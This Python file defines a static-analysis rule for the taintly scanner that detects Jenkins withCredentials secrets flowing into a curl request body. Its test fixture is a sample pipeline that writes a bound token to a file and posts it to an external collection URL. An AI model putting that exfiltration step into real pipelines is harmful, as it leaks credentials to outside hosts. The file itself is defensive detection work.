"""Source-bound Jenkins credential flow to a curl request body."""

from __future__ import annotations

import re
import tempfile
from dataclasses import dataclass
from pathlib import Path

from taintly.models import IncompletePatternMatches, Platform, Rule, Severity
from taintly.parsers.jenkinsfile import EventKind, walk_jenkinsfile
from taintly.rules._secret_network_shell import (
    _BODY_CANDIDATE,
    _Flow,
    _physical_source,
    analyze_shell_rows,
)

# A direct, single credential binding and a single literal sh body. The
# structural reader must independently attest both source and owner below.
_DIRECT = re.compile(
    r"withCredentials\s*\(\s*\[\s*string\s*\(\s*"
    r"credentialsId\s*:\s*'(?P<id>[^'\n]+)'\s*,\s*"
    r"variable\s*:\s*'(?P<var>[A-Za-z_][A-Za-z0-9_]*)'\s*"
    r"\)\s*\]\s*\)\s*\{\s*sh\s*'''(?P<body>.*?)'''\s*\}",
    re.DOTALL,
)


@dataclass(frozen=True)
class _Notes:
    notes: tuple[str, ...]


def _line(content: str, offset: int) -> int:
    return content.count("\n", 0, offset) + 1


class JenkinsSecretNetworkPattern:
    def check(self, content: str, _lines: list[str]):
        if "withCredentials" in content and _BODY_CANDIDATE.search(content):
            return IncompletePatternMatches(
                [], reason="SEC6-JK-012 physical Jenkinsfile source is required"
            )
        return []

    def self_test_check(self, sample: str):
        with tempfile.TemporaryDirectory() as root:
            path = Path(root) / "Jenkinsfile"
            path.write_text(sample, encoding="utf8")
            return self.check_with_filepath(sample, sample.splitlines(), str(path))

    def self_test_mutation_applicable(self, source: str, mutant: str, operator: str) -> bool:
        if operator != "quote_swap":
            return True
        original = tuple(walk_jenkinsfile(source))
        changed = tuple(walk_jenkinsfile(mutant))
        source_shells = [event for event in original if event.value_kind == "shell"]
        mutant_shells = [event for event in changed if event.value_kind == "shell"]
        # Groovy GString expansion and literal sh execution are different
        # interpreter stages; the generic quote mutator does not preserve it.
        if any(not event.interpolated for event in source_shells) and any(
            event.interpolated for event in mutant_shells
        ):
            return False
        # A single-quoted shell operand is literal, so it no longer carries
        # the bound credential into the file or request body.
        original_binding = _DIRECT.search(source)
        changed_binding = _DIRECT.search(mutant)
        if original_binding and changed_binding:
            variable = original_binding.group("var")
            literal = f"'${variable}'"
            if (literal in original_binding.group("body")) != (
                literal in changed_binding.group("body")
            ):
                return False
        return True

    def _analyze(self, content: str, filepath: str):
        if not ("withCredentials" in content and _BODY_CANDIDATE.search(content)):
            return [], {}, None
        digest = _physical_source(filepath, content)
        if digest is None:
            return [], {}, "SEC6-JK-012 source identity is unavailable"
        events = tuple(walk_jenkinsfile(content, recover=True))
        if any(event.kind in {EventKind.CUTOFF, EventKind.ERROR} for event in events):
            return [], {}, "SEC6-JK-012 Jenkinsfile structure is incomplete"
        matches: list[tuple[int, str]] = []
        notes: dict[tuple[int, str], str] = {}
        incomplete = False
        candidates = list(_DIRECT.finditer(content))
        if len(candidates) > 64:
            return [], {}, "SEC6-JK-012 direct-binding budget exceeded"
        for candidate in candidates:
            body = candidate.group("body")
            if not _BODY_CANDIDATE.search(body):
                continue
            variable = candidate.group("var")
            credential_id = candidate.group("id")
            variable_line = _line(content, candidate.start("var"))
            credential_line = _line(content, candidate.start("id"))
            shell_line = _line(content, candidate.start("body"))
            binders = [
                event
                for event in events
                if event.kind is EventKind.LEAF
                and not event.degraded
                and event.path[-3:] == ("withCredentials", "string", "variable")
                and event.value == variable
                and event.line == variable_line
            ]
            credential_ids = [
                event
                for event in events
                if event.kind is EventKind.LEAF
                and not event.degraded
                and event.path[-3:] == ("withCredentials", "string", "credentialsId")
                and event.value == credential_id
                and event.line == credential_line
                and any(event.path[:-1] == binder.path[:-1] for binder in binders)
            ]
            shells = [
                event
                for event in events
                if event.kind is EventKind.LEAF
                and not event.degraded
                and not event.interpolated
                and event.value_kind == "shell"
                and event.value == body
                and event.line == shell_line
                and any(binder.path[:-2] + ("sh",) == event.path for binder in binders)
            ]
            if len(binders) != 1 or len(credential_ids) != 1 or len(shells) != 1:
                incomplete = True
                continue
            rows = tuple((shell_line + index, raw) for index, raw in enumerate(body.splitlines()))
            source = {variable: _Flow(frozenset({f"withCredentials:{variable}"}), ())}
            flows, stopped = analyze_shell_rows(rows, source)
            incomplete |= stopped
            for line, command, flow in flows:
                item = (line, command)
                matches.append(item)
                hops = " -> ".join(f"{kind} line {number}" for number, kind in flow.hops)
                notes[item] = (
                    f"Source SHA256 {digest}; Jenkins withCredentials string binding {variable} "
                    f"at line {variable_line} reaches sh curl body via {hops}. "
                    "Credential availability, execution, destination trust and delivery are unknown."
                )
        if not matches and not candidates:
            incomplete = True
        return (
            matches,
            notes,
            (
                "SEC6-JK-012 candidate path stopped at unsupported binding or shell operation"
                if incomplete
                else None
            ),
        )

    def check_with_filepath(self, content: str, _lines: list[str], filepath: str):
        matches, _notes, incomplete = self._analyze(content, filepath)
        return IncompletePatternMatches(matches, reason=incomplete) if incomplete else matches

    def context_notes_for_matches(
        self, content: str, filepath: str, matches: list[tuple[int, str]]
    ):
        _matches, notes, _incomplete = self._analyze(content, filepath)
        return [_Notes((notes[item],)) if item in notes else None for item in matches]


_SAMPLE = (
    "pipeline {\n  agent any\n  stages {\n    stage('audit') {\n      steps {\n"
    "        withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {\n"
    "          sh '''echo $TOKEN > token.txt\n"
    "curl https://example.test/collect --data-binary @token.txt'''\n"
    "        }\n      }\n    }\n  }\n}\n"
)

RULES = [
    Rule(
        id="SEC6-JK-012",
        title="Jenkins bound credential may reach an outbound HTTP request body",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description="A direct withCredentials string binding reaches a curl request body in one literal sh step through a bounded shell path.",
        pattern=JenkinsSecretNetworkPattern(),
        remediation="Review whether the endpoint is intended to receive this credential. If not, remove the body transfer; if delivery is confirmed, investigate the run and rotate the affected credential.",
        reference="https://www.jenkins.io/doc/pipeline/steps/credentials-binding/",
        test_positive=[_SAMPLE],
        test_negative=[
            _SAMPLE.replace("--data-binary @token.txt", '-H "Authorization: Bearer $TOKEN"')
        ],
        finding_family="credential_exposure",
        confidence="medium",
        review_needed=True,
    )
]
